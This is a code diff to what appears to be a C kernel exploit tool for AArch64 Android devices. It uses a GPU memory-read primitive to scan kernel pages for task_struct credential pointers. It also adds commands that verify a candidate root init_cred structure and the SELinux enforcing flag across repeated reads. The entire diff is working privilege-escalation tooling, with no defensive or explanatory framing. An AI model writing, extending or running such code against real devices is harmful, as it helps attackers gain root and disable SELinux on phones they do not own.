@@ -317,36 +317,33 @@ int main(int argc, char **argv) {
                         p = memmem(buf, PAGE_SIZE, "init_cred", 9);
                         if (p) { found_sig = 4; found_off = (int)((uint8_t*)p - buf); }
                     }
-                    // 5. SELinux enforcing — look for 0x01 byte aligned to 4 bytes
-                    if (!found_sig) {
-                        for (int off = 0; off < PAGE_SIZE - 4; off += 4) {
-                            uint32_t v;
-                            memcpy(&v, buf + off, 4);
-                            if ((v & 0xFFFFFF00) == 0x00000000 ||
-                                (v & 0xFFFFFF00) == 0x00000100) {
-                                // candidate for selinux_enforcing (value 0 or 1, hi bytes zero)
-                                if (off > 0) {
-                                    uint32_t prev;
-                                    memcpy(&prev, buf + off - 4, 4);
-                                    if (prev == 0) {
-                                        found_sig = 5;
-                                        found_off = off;
-                                        break;
-                                    }
-                                }
-                            }
-                        }
-                    }
-                    // 6. cred pointer — kernel pointer (0xffffff...) at offset 0x770 from comm
+                    // 5. cred pointer — kernel pointer (0xffffff...) at expected task_struct offsets
                     if (!found_sig) {
                         for (int off = 0x700; off < 0x800 && off < PAGE_SIZE - 8; off += 8) {
                             uint64_t v;
                             memcpy(&v, buf + off, 8);
-                            // Kernel pointers on AArch64 typically 0xffffff8_ - 0xffffffc_
+                            // Kernel pointers on AArch64: 0xffffff80..0xffffffcf
+                            // AND aligned to 8 bytes (cred/real_cred are pointer-aligned)
                             if ((v >> 32) >= 0xffffff80 && (v >> 40) <= 0xffffffcf) {
-                                found_sig = 6;
-                                found_off = off;
-                                break;
+                                // Additional filter: must be non-null and not 0xffffffffffffffff
+                                if (v != 0 && v != 0xffffffffffffffffULL) {
+                                    // Check if comm area near 0x718 has a string (printable ASCII)
+                                    if (off >= 0x60 && off < 0x780) {
+                                        int printable = 1;
+                                        for (int k = (int)(off - 0x718); k >= 0 && k < 16; k++) {
+                                            uint8_t c = buf[k];
+                                            if (c != 0 && (c < 0x20 || c > 0x7e)) {
+                                                printable = 0;
+                                                break;
+                                            }
+                                        }
+                                        if (printable || (off - 0x718) < 16) {
+                                            found_sig = 6;
+                                            found_off = off;
+                                            break;
+                                        }
+                                    }
+                                }
                             }
                         }
                     }
@@ -372,6 +369,70 @@ int main(int argc, char **argv) {
             fprintf(stderr, "[SCAN] done\n");
             fflush(stderr);
             printf("SCAN_DONE\n");
+            fflush(stdout);
+        } else if (strncmp(line, "cred ", 5) == 0) {
+            // Strict init_cred verification: read and check structure
+            uint64_t va;
+            sscanf(line + 5, "%lx", &va);
+            uint8_t p1[PAGE_SIZE], p2[PAGE_SIZE];
+            int ok1 = (read_gpu_page(va, p1) == 0);
+            usleep(2000);
+            int ok2 = (read_gpu_page(va, p2) == 0);
+            if (!ok1 || !ok2) {
+                printf("CRED:READ_FAIL:%lx\n", (unsigned long)va);
+            } else {
+                // struct cred { atomic_t usage; kuid_t uid,gid,suid,sgid,euid,egid; ... }
+                // Layout: u32 usage, u32 uid, u32 gid, u32 suid, u32 sgid, u32 euid, u32 egid
+                uint32_t usage1, uid1, gid1, usage2, uid2, gid2;
+                memcpy(&usage1, p1 + 0,  4);
+                memcpy(&uid1,   p1 + 4,  4);
+                memcpy(&gid1,   p1 + 8,  4);
+                memcpy(&usage2, p2 + 0,  4);
+                memcpy(&uid2,   p2 + 4,  4);
+                memcpy(&gid2,   p2 + 8,  4);
+                if (usage1 != usage2 || uid1 != uid2 || gid1 != gid2) {
+                    printf("CRED:UNSTABLE:%lx:u=%u/%u id=%u/%u\n",
+                           (unsigned long)va, usage1, usage2, uid1, uid2);
+                } else if (uid1 == 0 && gid1 == 0 && usage1 > 0 && usage1 < 100) {
+                    // Looks like root init_cred (uid=gid=0, low usage count)
+                    printf("CRED:OK:%lx:usage=%u:uid=%u:gid=%u:root\n",
+                           (unsigned long)va, usage1, uid1, gid1);
+                } else if (uid1 == uid2 && gid1 == gid2) {
+                    printf("CRED:OK:%lx:usage=%u:uid=%u:gid=%u\n",
+                           (unsigned long)va, usage1, uid1, gid1);
+                } else {
+                    printf("CRED:FAIL:%lx\n", (unsigned long)va);
+                }
+            }
+            fflush(stdout);
+        } else if (strncmp(line, "selinux ", 8) == 0) {
+            // Strict SELinux enforcing check: read multiple times, verify stable value
+            uint64_t va;
+            sscanf(line + 8, "%lx", &va);
+            uint8_t p1[PAGE_SIZE], p2[PAGE_SIZE], p3[PAGE_SIZE];
+            int ok1 = (read_gpu_page(va, p1) == 0);
+            usleep(2000);
+            int ok2 = (read_gpu_page(va, p2) == 0);
+            usleep(2000);
+            int ok3 = (read_gpu_page(va, p3) == 0);
+            if (!ok1 || !ok2 || !ok3) {
+                printf("SELINUX:READ_FAIL:%lx\n", (unsigned long)va);
+            } else {
+                uint32_t v1, v2, v3;
+                memcpy(&v1, p1, 4);
+                memcpy(&v2, p2, 4);
+                memcpy(&v3, p3, 4);
+                // Must be stable across 3 reads, value 0 or 1
+                if (v1 == v2 && v2 == v3 && (v1 == 0 || v1 == 1)) {
+                    printf("SELINUX:OK:%lx:%u:stable\n", (unsigned long)va, v1);
+                } else if (v1 == v2 && v2 == v3) {
+                    printf("SELINUX:UNSTABLE:%lx:%u:changes_to_0_or_1\n",
+                           (unsigned long)va, v1);
+                } else {
+                    printf("SELINUX:FAIL:%lx:%u:%u:%u\n",
+                           (unsigned long)va, v1, v2, v3);
+                }
+            }
             fflush(stdout);
         } else if (strncmp(line, "kbase", 5) == 0) {
             // Auto-find kernel base by trying known addresses
